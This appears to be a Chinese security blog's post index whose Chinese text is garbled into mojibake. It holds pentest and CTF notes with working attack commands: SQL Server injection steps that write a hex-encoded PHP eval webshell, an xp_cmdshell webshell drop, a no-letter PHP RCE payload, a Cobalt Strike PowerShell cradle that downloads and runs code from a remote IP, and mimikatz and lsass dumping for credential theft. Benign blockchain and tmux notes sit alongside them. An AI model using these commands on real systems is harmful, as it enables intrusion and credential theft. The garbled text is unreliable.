è®ºæ˜¯LOGå¤‡ä»½è¿˜æ˜¯å·®å¼‚å¤‡ä»½ï¼Œéƒ½æ˜¯åˆ©ç”¨å¤‡ä»½çš„è¿‡ç¨‹ä¸­å†™å…¥ä¸€å¥è¯æœ¨é©¬####åˆ©ç”¨å‰æ ç›®æ ‡æœºå™¨å­˜åœ¨æ•°æ®åº“å¤‡ä»½æ–‡ä»¶ ï¼Œä¹Ÿå°±æ˜¯å¦‚æœæˆ‘ä»¬åˆ©ç”¨ test æ•°æ®åº“çš„è¯ï¼Œåˆ™éœ€è¦è¯¥testæ•°æ®åº“å­˜åœ¨æ•°æ®åº“å¤‡ä»½æ–‡ä»¶ï¼Œè€Œä¸”æ¢å¤æ¨¡å¼å¾—æ˜¯ å®Œæ•´æ¨¡å¼ çŸ¥é“ç½‘ç«™çš„ç»å¯¹è·¯å¾„ æ”¯æŒå †å æ³¨å…¥alter database æ•°æ®åº“å set RECOVERY FULL; #ä¿®æ”¹æ•°æ®åº“æ¢å¤æ¨¡å¼ä¸º å®Œæ•´æ¨¡å¼create table cmd (a image); #åˆ›å»ºä¸€å¼ è¡¨cmdï¼Œåªæœ‰ä¸€ä¸ªåˆ— aï¼Œç±»å‹ä¸ºimagebackup log æ•°æ®åº“å to disk= 'C:\\phpstudy\\WWW\\1.php' with init; #å¤‡ä»½è¡¨åˆ°æŒ‡å®šè·¯å¾„insert into cmd (a) values(0x3c3f70687020406576616c28245f504f53545b785d293b3f3e); #æ’å…¥ä¸€å¥è¯åˆ°cmdè¡¨é‡Œbackup log æ•°æ®åº“å to disk='C:\\phpstudy\\WWW\\2.php'; #æŠŠæ“ä½œæ—¥å¿—å¤‡ä»½åˆ°æŒ‡å®šæ–‡ä»¶drop table cmd; #åˆ é™¤cmdè¡¨ ç¬¬å››è¡Œçš„ 0x3c3f70687020406576616c28245f504f53545b785d293b3f3e æ˜¯ä¸€å¥è¯æœ¨é©¬ &lt;?php @eval($_POST[x]);?&gt; çš„16è¿›åˆ¶è¡¨ç¤º å…¶ä¸­2.phpæ‰æ˜¯æˆ‘ä»¬çš„æœ¨é©¬æ–‡ä»¶ ####DB_owneræƒé™å·®å¼‚å¤‡ä»½Getshell çŸ¥é“ç»å¯¹è·¯å¾„ æ”¯æŒå †å æ³¨å…¥create table [dbo].[test] ([cmd] [image])declare @a sysname,@s nvarchar(4000) select @a=db_name(),@s=0x786965 backup log @a to disk = @s with init,no_truncateinsert into [test](cmd) values(0x3c3f70687020406576616c28245f504f53545b785d293b3f3e)declare @a sysname,@s nvarchar(4000) select @a=db_name(),@s=0x43003A005C00700068007000730074007500640079005C005700570057005C007300680065006C006C002E00700068007000 backup log @a to disk=@s with init,no_truncateDrop table [test] ###ç›²æ³¨SQLServeræ•°æ®åº“ 1.åˆ¤æ–­æ˜¯å¦ä¸ºSQLServeræ•°æ®åº“ exists(select * from sysobjects) 2.åˆ¤æ–­å½“å‰æ•°æ®åº“ç”¨æˆ·æƒé™ and 1=(IS_SRVROLEMEMBER('sysadmin')) //è¿”å›æ­£å¸¸ä¸ºsaand 1=(IS_MEMBER('db_owner')) //è¿”å›æ­£å¸¸ä¸ºDB_OWNERand 1=(IS_srvrolemember('public')) //publicæƒé™,è¾ƒä½ SAæƒé™æ—¶ï¼Œä¸‰ä¸ªéƒ½è¿”å›trueï¼ŒDB_OWNERæ—¶saå°±è¿”å›false3.åˆ¤æ–­xp_cmdshellæ˜¯å¦å­˜åœ¨ and 1=(Select count(*) FROM master..sysobjects Where xtype = 'X' AND name = 'xp_cmdshell') å¼€å¯åï¼Œå¦‚æœéœ€è¦æ‰§è¡Œå‘½ä»¤ï¼Œåˆ™éœ€è¦å †å æ³¨å…¥###åˆ©ç”¨å †å æ³¨å…¥è·å–SQLServeræƒé™ ç›®æ ‡ç½‘ç«™æ³¨å…¥æ”¯æŒå †å æ³¨å…¥ å½“å‰æƒé™æ˜¯SAæƒé™ ä½¿ç”¨sqlmapçš„ â€“os-shell æ— æ³•è·å–åˆ°æƒé™åˆ©ç”¨æ€è·¯ï¼šè·å–ç½‘ç«™ç»å¯¹è·¯å¾„åå†™é©¬è·å–æƒé™åˆ©ç”¨çš„æŸ¥æ‰¾å‘½ä»¤ï¼šæŸ¥æ‰¾ç›®æ ‡æœºå™¨Cç›˜ä¸‹çš„test.txtæ–‡ä»¶for /r c:\\ %i in (test*.txt) do @echo %i #è¿™é‡Œçš„æ–‡ä»¶ååç¼€å‰é‚£ä¸ªç‚¹ä¸€å®šè¦åŠ *å·dir /s /b c:\\test.txt åˆ©ç”¨è¿‡ç¨‹ï¼š 1.å·²çŸ¥ç›®æ ‡ç½‘ç«™ä¸‹æœ‰ä¸€ä¸ªtest.txtæ–‡ä»¶ åˆ›å»ºè¡¨hackï¼Œå¹¶æ·»åŠ ä¸€ä¸ªtmpçš„å­—æ®µcreate table hack (tmp varchar(1000));-- æŸ¥æ‰¾ç½‘ç«™ç»å¯¹è·¯å¾„ï¼Œå¹¶å°†å…¶å†™å…¥è¡¨ä¸­ä»¥ä¾›æŸ¥è¯¢ 2.æŸ¥æ‰¾ç›®æ ‡æœºå™¨Cç›˜ä¸‹çš„test.txtè·¯å¾„ï¼Œå¹¶å°†ç»“æœå†™å…¥åˆšåˆšåˆ›å»ºçš„hackè¡¨çš„tmpå­—æ®µ;insert into hack(tmp) exec master..xp_cmdshell 'dir /s /b c:\\test.txt';--æˆ–;insert into hack(tmp) exec master..xp_cmdshell 'for /r c:\\ %i in (test*.txt) do @echo %i' 3.å°†æœ¨é©¬å†™å…¥ç½‘ç«™æ ¹ç›®å½•ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯&lt;&gt;å‰é¢éƒ½éœ€è¦åŠ ä¸Š^ 1;exec master..xp_cmdshell 'echo ^&lt;?php @eval($_POST[x]);?^&gt; &gt; C:\\phpstudy\\www\\shell.php';--","link":"/2022/12/20/sql_server%E6%B3%A8%E5%85%A5/"},{"title":"ä»£ç å®¡è®¡å°è®°","text":"##å¯è®¿é—®æ–‡ä»¶æ”¶é›†å¦‚æœå­˜åœ¨ååºåˆ—åŒ–ï¼Œè¿™é‡Œå¯ä»¥ç›´æ¥åˆ©ç”¨.//wp-content/plugins/product-import-export-for-woo/admin/modules/product_tags/import/import.php:272 : è¯»å–æ–‡ä»¶å‡½æ•°ä¸­å­˜åœ¨å˜é‡ï¼Œå¯èƒ½å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ å¦‚æœå¯ä»¥è¦†ç›–æ–‡ä»¶å†™å…¥çš„è¯.//wp-content/plugins/woocommerce-germanized/vendor/globalcitizen/php-iban/php-iban.php:607 : è¯»å–æ–‡ä»¶å‡½æ•°ä¸­å­˜åœ¨å˜é‡ï¼Œå¯èƒ½å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´","link":"/2022/08/09/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"title":"ä½¿ç”¨frpè¿›è¡Œæµé‡è½¬å‘","text":"ä¸ºä»€ä¹ˆä½¿ç”¨FRPé€šè¿‡åœ¨å…·æœ‰å…¬ç½‘ IP çš„èŠ‚ç‚¹ä¸Šéƒ¨ç½² frp æœåŠ¡ç«¯ï¼Œå¯ä»¥è½»æ¾åœ°å°†å†…ç½‘æœåŠ¡ç©¿é€åˆ°å…¬ç½‘ï¼ŒåŒæ—¶æä¾›è¯¸å¤šä¸“ä¸šçš„åŠŸèƒ½ç‰¹æ€§ï¼Œè¿™åŒ…æ‹¬ï¼š å®¢æˆ·ç«¯æœåŠ¡ç«¯é€šä¿¡æ”¯æŒ TCPã€KCP ä»¥åŠ Websocket ç­‰å¤šç§åè®®ã€‚ é‡‡ç”¨ TCP è¿æ¥æµå¼å¤ç”¨ï¼Œåœ¨å•ä¸ªè¿æ¥é—´æ‰¿è½½æ›´å¤šè¯·æ±‚ï¼ŒèŠ‚çœè¿æ¥å»ºç«‹æ—¶é—´ã€‚ ä»£ç†ç»„é—´çš„è´Ÿè½½å‡è¡¡ã€‚ ç«¯å£å¤ç”¨ï¼Œå¤šä¸ªæœåŠ¡é€šè¿‡åŒä¸€ä¸ªæœåŠ¡ç«¯ç«¯å£æš´éœ²ã€‚ å¤šä¸ªåŸç”Ÿæ”¯æŒçš„å®¢æˆ·ç«¯æ’ä»¶(é™æ€æ–‡ä»¶æŸ¥çœ‹ï¼ŒHTTPã€SOCK5 ä»£ç†ç­‰)ï¼Œä¾¿äºç‹¬ç«‹ä½¿ç”¨ frp å®¢æˆ·ç«¯å®ŒæˆæŸäº›å·¥ä½œã€‚ é«˜åº¦æ‰©å±•æ€§çš„æœåŠ¡ç«¯æ’ä»¶ç³»ç»Ÿï¼Œæ–¹ä¾¿ç»“åˆè‡ªèº«éœ€æ±‚è¿›è¡ŒåŠŸèƒ½æ‰©å±•ã€‚ æœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯ UI é¡µé¢ã€‚ FRPå®ç°åŸç†frp ä¸»è¦ç”±å®¢æˆ·ç«¯(frpc)å’ŒæœåŠ¡ç«¯(frps)ç»„æˆï¼ŒæœåŠ¡ç«¯é€šå¸¸éƒ¨ç½²åœ¨å…·æœ‰å…¬ç½‘ IP çš„æœºå™¨ä¸Šï¼Œå®¢æˆ·ç«¯é€šå¸¸éƒ¨ç½²åœ¨éœ€è¦ç©¿é€çš„å†…ç½‘æœåŠ¡æ‰€åœ¨çš„æœºå™¨ä¸Šå†…ç½‘æ²¡æœ‰å…¬ç½‘ipï¼Œæ‰€ä»¥ä½¿ç”¨å…¬ç½‘æœåŠ¡å™¨æ­è½½frpï¼Œå†…ç½‘åè¿å…¬ç½‘frpï¼Œå…¶ä»–äººéœ€è¦è®¿é—®å†…ç½‘çš„å‘èµ·è¯·æ±‚æ—¶ï¼Œé€šè¿‡frpçš„ä»£ç†åˆ°è¾¾å†…ç½‘ è¿‡ç¨‹1.frps frp æœåŠ¡ç«¯çš„é…ç½® [common]server_port = 7000 2.frpc frpå®¢æˆ·ç«¯ï¼Œä¹Ÿå°±æ˜¯ä½ è¦è®¿é—®çš„æœºå™¨ é…ç½®ï¼š server_addræ˜¯æœåŠ¡ç«¯çš„ipï¼Œserver_portæ˜¯æœåŠ¡ç«¯å¼€æ”¾çš„ç«¯å£ï¼Œtokenå°±æ˜¯tokenï¼Œåˆ°æ—¶å€™é…ç½®çš„ä»£ç†ï¼Œipæ˜¯æœåŠ¡å™¨çš„ipï¼Œç«¯å£èµ°çš„æ˜¯7004ï¼Œä¹Ÿå°±æ˜¯remote_port [common]server_addr = 192.168.137.182server_port = 7000token = 9283eae321dtls_enable=true [socks5]type = tcplocal_ip = 127.0.0.1remote_port = 7004plugin = socks5 æŒ‡ä»¤ï¼š frpc -c frpc_full.inifrps -c frps.ini","link":"/2022/07/05/%E4%BD%BF%E7%94%A8frp%E8%BF%9B%E8%A1%8C%E6%B5%81%E9%87%8F%E8%BD%AC%E5%8F%91/"},{"title":"åŸºäºfabricçš„åŒºå—é“¾é¡¹ç›®","text":"#æ­å»ºfabricç¯å¢ƒ##é…ç½®è¯ä¹¦fabricç½‘ç»œä¸­èŠ‚ç‚¹ä¹‹é—´é€šè®¯éƒ½éœ€è¦æä¾›è¯ä¹¦ç”¨æ¥æ ‡è¯†è‡ªå·±çš„èº«ä»½cryptogenå·¥å…·å¿«é€Ÿç”Ÿæˆç›¸å…³è¯ä¹¦##é…ç½®ç³»ç»Ÿé“¾åˆ›ä¸–å—fabricç³»ç»Ÿé…ç½®æ˜¯å­˜æ”¾åœ¨åŒºå—é“¾ä¸Šçš„ï¼Œç³»ç»ŸæˆåŠŸè¿è¡Œè‡³å°‘è¦æœ‰ä¸€ä¸ªé“¾configtxgenç”Ÿæˆç³»ç»Ÿé“¾ï¼Œç¬¬ä¸€ä¸ªæ•°æ®å—ä¿å­˜äº†ç”¨æˆ·å®šä¹‰çš„ä¸€äº›é…ç½®ï¼Œ ä¼šè¯»å–configtx.yamlå’Œcrypto-configæ–‡ä»¶ä¸‹çš„è¯ä¹¦ç”¨äºç”Ÿæˆchannelçš„åˆ›ä¸–å—ç”Ÿæˆçš„ genesis.block æ˜¯ç³»ç»Ÿé“¾çš„ç¬¬ä¸€ä¸ªåŒºå—ï¼Œé‡Œé¢å­˜æ”¾äº† Orderer èŠ‚ç‚¹ã€Orderer ç®¡ç†å‘˜çš„è¯ä¹¦ï¼Œåœ¨ Orderer èŠ‚ç‚¹å¯åŠ¨æ—¶ä¼šç”¨åˆ°è¿™ä¸ªæ•°æ®å—ã€‚##å¦‚ä½•ç†è§£fabricç±»ä¼¼äºä¸€ä¸ªæœåŠ¡å™¨ï¼Œç„¶åï¼Œfabricç”¨goè¯­è¨€å®ç°é“¾ç ï¼Œå®ç°å¯¹peerèŠ‚ç‚¹çš„æ“ä½œï¼Œä¹Ÿå³æ˜¯æ™ºèƒ½åˆçº¦ã€‚###é“¾ç ä¸€å…±æœ‰äº”ä¸ªèŠ‚ç‚¹ï¼Œåˆ†ä¸ºå†œæˆ·ã€farmerã€‘ï¼ŒåŸæ–™å‚å•†ã€materialã€‘ï¼Œç”Ÿäº§å‚å•†ã€productinfo+productProcessã€‘ï¼Œç‰©æµå‚å•†ã€driverã€‘ï¼Œé›¶å”®å•†ã€retailerã€‘####ç‰©æµå‚å•†å®šä¹‰ä¸Šé“¾çš„ä¿¡æ¯ç»“æ„ä½“é€šè¿‡apiæ¥å£ä½¿ç”¨å„å‡½æ•°å…¶ä»–çš„é“¾ç å®šä¹‰æ–¹å¼åŒä¸Š####è·¯ç”±å®šä¹‰å„ä¸ªèŠ‚ç‚¹çš„è·¯ç”±####apiä»£ç å¼•å…¥fabric-clientæ¨¡å—ï¼ŒåŸºäºæ­¤æ¨¡å—è¿›è¡ŒfabricåŒºå—é“¾ç½‘ç»œçš„èŠ‚ç‚¹åŠŸèƒ½è°ƒç”¨é€šè¿‡å®šä¹‰å¤šä¸ªè·¯ç”±ï¼Œåˆ©ç”¨ä»¥ä¸‹ä»£ç è¿›è¡ŒåŒºå—é“¾çš„ä¸Šé“¾æŸ¥è¯¢ç­‰æ“ä½œ åœ¨åŒºå—é“¾ç¯å¢ƒä¸­ï¼Œæ¯ä¸ªå¸Œæœ›äºç½‘ç»œäº¤äº’çš„å‚ä¸è€…éƒ½éœ€è¦ä¸€ä¸ªèº«ä»½ï¼Œcaæä¾›å¯éªŒè¯çš„æ•°å­—èº«ä»½","link":"/2022/12/17/%E5%9F%BA%E4%BA%8Efabric%E7%9A%84%E5%8C%BA%E5%9D%97%E9%93%BE%E9%A1%B9%E7%9B%AE/"},{"title":"åŒºå—é“¾æœåŠ¡å™¨æ­å»ºå°è®°","text":"","link":"/2022/03/18/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA%E5%B0%8F%E8%AE%B0/"},{"title":"æ— å­—ç¬¦rceå°è®°","text":"##åˆ©ç”¨è‡ªå¢ $_=_(a/a)[_];//N$a=++$_;//O$$a[$a=_.++$_.$a[$_++/$_++].++$_.++$_]($$a[_]); payload ctf_show=$_=_(%ff/%ff)[_];$%ff=%2b%2b$_;$$%ff[$%ff=_.%2b%2b$_.$%ff[$_%2b%2b/$_%2b%2b].%2b%2b$_.%2b%2b$_]($$%ff[_]);&amp;_POST=system&amp;_=cat /f1agaaa","link":"/2022/10/12/%E6%97%A0%E5%AD%97%E7%AC%A6rce/"},{"title":"æ¸—é€å·¥å…·å¤‡å¿˜å½•","text":"webshellå·¥å…·å†°èå†°èçš„è¿æ¥è¾ƒä¸ºç®€å•ï¼šè¾“å…¥urlå’Œå¯†ç ä»¥åé€‰æ‹©è„šæœ¬ç±»å‹å³å¯ä¸Šçº¿ å“¥æ–¯æ‹‰å“¥æ–¯æ‹‰é©¬ç”Ÿæˆç®¡ç†â€”â€”&gt;ç”Ÿæˆâ€”â€”&gt;ç”Ÿæˆå¯¹åº”çš„é©¬å¹¶é€‰æ‹©æœ‰æ•ˆè½½è·å’ŒåŠ å¯†å™¨ å“¥æ–¯æ‹‰é©¬è¿æ¥ï¼šè¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯è¦è®°å¾—é…ç½®ä»£ç†ï¼Œå¦åˆ™ä¼šé“¾æ¥å¤±è´¥ï¼Œå¹¶ä¸”åŠ å¯†å™¨è¦å’Œåˆšæ‰çš„å¯¹åº” CSå°†CSä¸Šä¼ è‡³å…¬ç½‘æœåŠ¡å™¨ï¼Œæ‰§è¡Œä¸€ä¸‹å°±å¯ä»¥å¯åŠ¨ï¼Œæ¥ä¸‹æ¥å°†æ­¤IPä»¥åŠå¯†ç å¡«å…¥å³å¯ï¼Œç„¶åç«¯å£æ˜¯50050 è·å–beaconåˆ›å»ºlistenerç‚¹å‡»cobalt strikeâ€”â€”&gt;listenersâ€”â€”&gt;Addï¼ˆè¿™é‡Œçš„ç«¯å£éœ€è¦è®¾ç½®æˆæœåŠ¡å™¨ä¸Šæœªä½¿ç”¨çš„ç«¯å£ï¼‰ web Delivery æ‰§è¡Œpayloadé€‰æ‹©scripted web deliveryï¼Œç„¶åç”Ÿæˆpayload æ¥ä¸‹æ¥è¿›è¡Œlaunchå³å¯ powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring('http://110.42.xxxx:8888/a'))&quot; ç„¶åå³é”®å•å‡»è¿›è¡Œinteractå³å¯æ‰§è¡Œå‘½ä»¤ tmuxå¿«æ·é”®æ“ä½œå‘ç°tmuxå¤§å®¶ä»‹ç»çš„ä¸é”™ï¼Œæ‰€ä»¥æƒ³å°è¯•ä¸€ä¸‹ï¼Œä½†å‘ç°æ— è®ºctrl+aï¼Œè¿˜æ˜¯ctrl+béƒ½ä¸å¥½ä½¿ï¼Œç»è¿‡ä¸€ç•ªåŠªåŠ›åæ‰å‘ç°åº”è¯¥æ˜¯ctrl+bæ¾å¼€åå†æŒ‰å…¶ä»–é”®ã€‚ä¾‹å¦‚ctrl+b ï¼Ÿï¼Œåº”è¯¥å…ˆåŒæ—¶æŒ‰ctrl+b æ¾å¼€åï¼Œshift+/ï¼ˆå³è¾“å…¥ï¼Ÿï¼‰ã€‚ # æŸ¥çœ‹æœ‰æ‰€æœ‰tmuxä¼šè¯æŒ‡ ä»¤ï¼štmux lså¿«æ·é”®ï¼šCtrl+b s# æ–°å»ºtmuxçª—å£æŒ‡ ä»¤ï¼štmux new -s &lt;session-name&gt;# é‡å‘½åä¼šè¯æŒ‡ ä»¤ï¼štmux rename-session -t &lt;old-name&gt; &lt;new-name&gt;å¿«æ·é”®ï¼šCtrl+b $# åˆ†ç¦»ä¼šè¯æŒ‡ ä»¤ï¼štmux detach æˆ–è€…ä½¿ç”¨ exit(å…³é—­çª—å£)å¿«æ·é”®ï¼šCtrl+b d# é‡æ–°è¿æ¥ä¼šè¯æŒ‡ ä»¤ï¼štmux attach -t &lt;session-name&gt; æˆ–è€…ä½¿ç”¨ tmux at -t &lt;session-name&gt;#å¹³é“ºå½“å‰çª—æ ¼ï¼ˆä¸ªäººå¾ˆå–œæ¬¢çš„å¿«æ·é”®ï¼Œæ³¨æ„ï¼šå¹³é“ºçš„æ˜¯å½“å‰é€‰ä¸­çš„çª—æ ¼ï¼‰å¿«æ·é”®ï¼šCtrl+b z (å†æ¬¡ Ctrl+b z åˆ™æ¢å¤)# æ€æ­»ä¼šè¯æŒ‡ ä»¤ï¼štmux kill-session -t &lt;session-name&gt;# åˆ‡æ¢ä¼šè¯æŒ‡ ä»¤ï¼štmux switch -t &lt;session-name&gt;# åˆ’åˆ†ä¸Šä¸‹ä¸¤ä¸ªçª—æ ¼æŒ‡ ä»¤ï¼štmux splitå¿«æ·é”®ï¼šCtrl+b â€œ# åˆ’åˆ†å·¦å³ä¸¤ä¸ªçª—æ ¼æŒ‡ ä»¤ï¼štmux split -hå¿«æ·é”®ï¼šCtrl+b %# å…‰æ ‡åˆ‡æ¢åˆ°ä¸Šæ–¹çª—æ ¼æŒ‡ ä»¤ï¼štmux select-pane -Uå¿«æ·é”®ï¼šCtrl+b æ–¹å‘é”®ä¸Š# å…‰æ ‡åˆ‡æ¢åˆ°ä¸‹æ–¹çª—æ ¼æŒ‡ ä»¤ï¼štmux select-pane -Då¿«æ·é”®ï¼šCtrl+b æ–¹å‘é”®ä¸‹# å…‰æ ‡åˆ‡æ¢åˆ°å·¦è¾¹çª—æ ¼æŒ‡ ä»¤ï¼štmux select-pane -Lå¿«æ·é”®ï¼šCtrl+b æ–¹å‘é”®å·¦# å…‰æ ‡åˆ‡æ¢åˆ°å³è¾¹çª—æ ¼æŒ‡ ä»¤ï¼štmux select-pane -Rå¿«æ·é”®ï¼šCtrl+b æ–¹å‘é”®å³ https://blog.csdn.net/svap1/article/details/39694713 frpä»£ç†é…ç½®é¦–å…ˆé…ç½®ä¸€ä¸‹æœåŠ¡å™¨çš„ä»£ç†ï¼Œåˆ é™¤frpc å’Œ frpc.iniï¼Œç¼–è¾‘frps.ini frpc.inié…ç½®ï¼Œå¦‚æœæ¢äº†vps æ”¹ä¸€ä¸‹ipå³å¯ å‘½ä»¤ ./frps -c frps.ini #å¯ç”¨æœåŠ¡ç«¯frp mimikatzæ³¨æ„ï¼šå½“ç›®æ ‡ä¸ºwin10æˆ–2012R2ä»¥ä¸Šæ—¶ï¼Œé»˜è®¤åœ¨å†…å­˜ç¼“å­˜ä¸­ç¦æ­¢ä¿å­˜æ˜æ–‡å¯†ç ï¼Œä½†å¯ä»¥é€šè¿‡ä¿®æ”¹æ³¨å†Œè¡¨çš„æ–¹å¼æŠ“å–æ˜æ–‡ã€‚ reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f windows2003ä½¿ç”¨ç®¡ç†å‘˜èº«ä»½è¿è¡Œ #æå‡æƒé™privilege::debug#æŠ“å–å¯†ç sekurlsa::logonpasswords å½“ç›®æ ‡ä¸ºwin10æˆ–2012R2ä»¥ä¸Šæ—¶ï¼Œé»˜è®¤åœ¨å†…å­˜ç¼“å­˜ä¸­ç¦æ­¢ä¿å­˜æ˜æ–‡å¯†ç ï¼Œä½†å¯ä»¥é€šè¿‡ä¿®æ”¹æ³¨å†Œè¡¨çš„æ–¹å¼æŠ“å–æ˜æ–‡ã€‚ cmdä¿®æ”¹æ³¨å†Œè¡¨å‘½ä»¤ï¼š Copyreg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f#é‡å¯æˆ–ç”¨æˆ·é‡æ–°ç™»å½•åå¯ä»¥æˆåŠŸæŠ“å– mimikatz # logmimikatz # privilege::debugmimikatz # sekurlsa::logonpasswords è·å–é«˜ç‰ˆæœ¬windowsç³»ç»Ÿçš„å¯†ç å‡­è¯(procdumpå¯¼å‡º)ä½¿ç”¨procdumpå°†lsass dumpä¸‹æ¥ï¼ˆéœ€è¦ç®¡ç†å‘˜æƒé™ï¼‰ procdump.exe -accepteula -ma lsass.exe 1.dmp å°†lsass.dmpä¸‹è½½åˆ°æœ¬åœ°åï¼Œç„¶åæ‰§è¡Œmimikatz: Copymimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; exit ä¸ºäº†æ–¹ä¾¿å¤åˆ¶ä¸æŸ¥çœ‹ï¼Œå¯ä»¥è¾“å‡ºåˆ°æœ¬åœ°æ–‡ä»¶é‡Œé¢ï¼š Copymimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; &gt; pssword.txt crackmap","link":"/2022/04/18/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E5%A4%87%E5%BF%98%E5%BD%95-shell%E5%B7%A5%E5%85%B7%E7%AF%87/"},{"title":"æ¸—é€æµ‹è¯•å¤‡å¿˜å½•â€”ä¿¡æ¯æœé›†","text":"åŸºæœ¬æ¶æ„ ASP+ACCESS + II5.0/6.0+Windows server 2003 ASPX+Mssql+iis 7.0/7.5+ Windows server 2008 PHP+MYSQL+IIS PHP+MYSQL+Apache PHP+MYSQL+IIS JSP+MYSQL+Nginx JSP+Mssql+Tomcat Jsp+oracle+Tomcat åŸŸç¯å¢ƒåˆ¤æ–­1. æŸ¥çœ‹ç½‘å…³IPåœ°å€ã€Dnsçš„IPåœ°å€ã€åŸŸåã€æœ¬æœºæ˜¯å¦å’ŒDNSæœåŠ¡å™¨å¤„äºåŒä¸€ç½‘æ®µ ipconfig /all ç„¶åè¿‡åå‘è§£ææŸ¥è¯¢å‘½ä»¤nslookupæ¥è§£æåŸŸåçš„IPåœ°å€ï¼Œç”¨è§£æå¾—åˆ°çš„IPåœ°å€è¿›è¡Œå¯¹æ¯”ï¼Œåˆ¤æ–­åŸŸæ§åˆ¶å™¨å’ŒDNSæœåŠ¡å™¨æ˜¯å¦åœ¨åŒä¸€å°æœåŠ¡å™¨ä¸Š 2.æŸ¥çœ‹ç³»ç»Ÿè¯¦ç»†ä¿¡æ¯ systeminfo åŸŸå¦‚æœä¸ºWORKGROUPï¼Œåˆ™è¡¨ç¤ºæœåŠ¡å™¨ä¸åœ¨åŸŸå†…ã€‚ 3.æŸ¥è¯¢å½“å‰ç™»å½•åŸŸåŠç™»å½•ç”¨æˆ·ä¿¡æ¯ â€œå·¥ä½œç«™åŸŸDNSåç§°â€å¦‚æœä¸ºWORKGROUPï¼Œåˆ™è¡¨ç¤ºä¸ºéé¢„ç¯å¢ƒï¼Œâ€ç™»å½•åŸŸâ€œç”¨äºè¡¨ç¤ºå½“å‰ç™»å½•çš„ç”¨æˆ·æ˜¯åŸŸç”¨æˆ·è¿˜æ˜¯æœ¬åœ°ç”¨æˆ· net config workstation 4.åˆ¤æ–­ä¸»åŸŸ net time /domain æ‹’ç»è®¿é—®â€”â€”&gt;å­˜åœ¨åŸŸï¼Œå½“å‰ç”¨æˆ·ä¸æ˜¯åŸŸç”¨æˆ· å‘½ä»¤æˆåŠŸå®Œæˆâ€”â€”&gt;å­˜åœ¨åŸŸï¼Œä¸”å½“å‰ç”¨æˆ·æ˜¯åŸŸç”¨æˆ· å·¥ä½œç»„â€”â€”&gt;æ‰¾ä¸åˆ°åŸŸ","link":"/2022/04/20/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%A4%87%E5%BF%98%E5%BD%95%E2%80%94%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"},{"title":"2022è™ç¬¦","text":"babysqlæ¯”èµ›çš„æ—¶å€™ä¸€å¼€å§‹æ²¡å‘ç°è¿‡æ»¤äº†ç©ºæ ¼ï¼Œæ‰€ä»¥ä¸€ç›´å‡ºä¸äº†ï¼Œåæ¥æ‰å‘ç°ï¼Œæ‰€ä»¥è¯´ï¼Œå¯¹äºä¸ç¡®å®šçš„æ­£åˆ™è¡¨è¾¾å¼è¿˜æ˜¯è¦å»å®é™…æµ‹è¯•ä¸€ä¸‹æ‰è¡Œï¼Œç„¶åä¸€çœ‹å°±æ˜¯è¦ç›²æ³¨ï¼Œç”±äºè¿‡æ»¤äº†æ‹¬å· .replace(/[\\s,()#;*\\-]/g, '').replace(/^.*(?=union|binary).*$/gi, '').toString(); æ‰€ä»¥é¦–é€‰è‚¯å®šæ˜¯caseï¼Œæ¥ä¸‹æ¥å°±æ˜¯æ„é€ ç›²æ³¨è¯­å¥äº†ï¼Œç”±äºæ˜¯è¦ç”¨regexpæ¥æ„é€ ï¼Œè¯»ä¸€ä¸‹æ–‡æ¡£ï¼Œå‘ç°regexpå¯ä»¥ç›´æ¥ä½œä¸ºç­‰å·æ¥ä½¿ç”¨ï¼Œå¹¶ä¸”æ— éœ€ç©ºæ ¼ï¼Œå¯ç›´æ¥æ¯”å¯¹å†…å®¹ï¼Œä¸€å¼€å§‹æ„é€ çš„æ˜¯,é—®é¢˜åœ¨äºç›´æ¥è¿™æ ·æ˜¯ä¼šçˆ†å‡ºè¯­æ³•é”™è¯¯çš„ï¼Œè¿™ä¸ªæ—¶å€™â€™1â€™å’Œcaseç›´æ¥éœ€è¦æœ‰ä¸œè¥¿éš”å¼€ï¼Œå½“æ—¶æ€ç»´ç¦é”¢ä½äº†ï¼Œæ²¡æƒ³åˆ°ä½¿ç”¨||ã€‚ã€‚ã€‚ã€‚å‚»é€¼äº† or'1'='1'case'1'whenxxxx æ„é€ å‡ºæ¥ä»¥åå¯ä»¥å¾—åˆ° 'a'||case'1'when'1'then'1'else'0'end||'a'; ï¼Œæ¥ä¸‹æ¥å°±æ˜¯ä½¿ç”¨regexpè¿›è¡Œç›²æ³¨ï¼Œç›²æ³¨çš„ç»“æœåˆ†ä¸ºä¸¤ç§ï¼Œä¸€ç§æ˜¯çŠ¶æ€401ï¼Œä¸€ç§æ˜¯çŠ¶æ€500,500æ˜¯å› ä¸ºæŠ¥é”™æ‰ä¼šäº§ç”Ÿçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±æ„é€ ä¸€ä¸ªæŠ¥é”™ç›²æ³¨,ç”±äºä¸èƒ½ä½¿ç”¨å‡½æ•°ï¼Œæ‰€ä»¥è¿™é‡Œå¯ä»¥é€šè¿‡æ•°å€¼ä¹‹é—´çš„å¤§æ•°è¿ç®—æ¥å¼•èµ·æŠ¥é”™ 'a'||case'1'when'1'then'1'else~0+~0+'a'end||'a'; æ¥ä¸‹æ¥å°±æ˜¯å®Œå–„æœ€é‡è¦çš„regexpçš„ç›²æ³¨éƒ¨åˆ†äº† '||case'1'when`username`regexp'^Db'then'1'else~0+~0+'a'end||'a' limit 1; 